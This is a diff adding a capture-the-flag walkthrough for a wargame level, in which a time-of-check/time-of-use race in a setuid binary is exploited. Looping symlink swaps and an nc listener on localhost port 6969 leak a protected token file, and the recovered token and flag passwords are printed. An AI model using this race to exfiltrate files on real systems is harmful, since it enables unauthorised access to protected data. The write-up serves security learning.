@@ -1,0 +1,16 @@
+1. run with ./level10 token we have: sends file to host if you have access to it
+2. ./level10 token localhost we have: You don't have access to token
+3. with strings level10 we know that they are listenning on the port 6969
+4. with nm level10 we know this binary is using access and open for file access, with man we know 
+  Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security
+       hole, because the user might exploit the short time interval between checking and opening the file to manipulate it.  For this reason, the  use
+       of this system call should be avoided.
+5. create the create.sh for a symblink
+6. since we wanna actions to happen all the time, we do a shell scripting with true
+7. open 3 windows for that
+ 7.1 while true; do sh create.sh ; done
+ 7.2 while true; do ./level10 /tmp/link 127.0.0.1; done
+ 7.3 while true; do nc 127.0.0.1 -l 6969; done
+8. we got a token woupa2yuojeeaaed06riuj63c  it's the pass for flag10
+9. run getflag we have the token feulo4b72j7edeahuete3no7c
+
